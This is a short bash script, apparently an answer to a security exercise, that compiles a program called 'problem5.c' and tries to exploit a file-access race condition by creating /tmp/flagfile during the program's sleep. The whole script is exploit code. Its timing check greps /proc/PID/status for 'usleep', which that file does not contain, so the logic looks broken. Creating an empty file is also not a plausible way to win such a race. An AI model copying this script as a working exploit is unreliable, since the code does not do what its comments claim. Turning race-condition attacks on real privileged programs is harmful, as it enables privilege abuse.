#!/bin/bash

# Compile the vulnerable program
gcc problem5.c -o out/problem5

# Execute the vulnerable program and get its PID
./out/problem5 &
PID=$!

# Sleep briefly to ensure that the program starts and enters the usleep call
sleep 0.1

# Wait for the program to finish its access check and enter the usleep call
while ps -p $PID > /dev/null; do
    # Check if the program is in the usleep call
    if grep -q usleep /proc/$PID/status; then
        # Attempt to open the file at the right timing to exploit the vulnerability
        touch /tmp/flagfile
        break
    fi
done

# Wait for the program to finish
wait $PID

# Clean up
rm /tmp/flagfile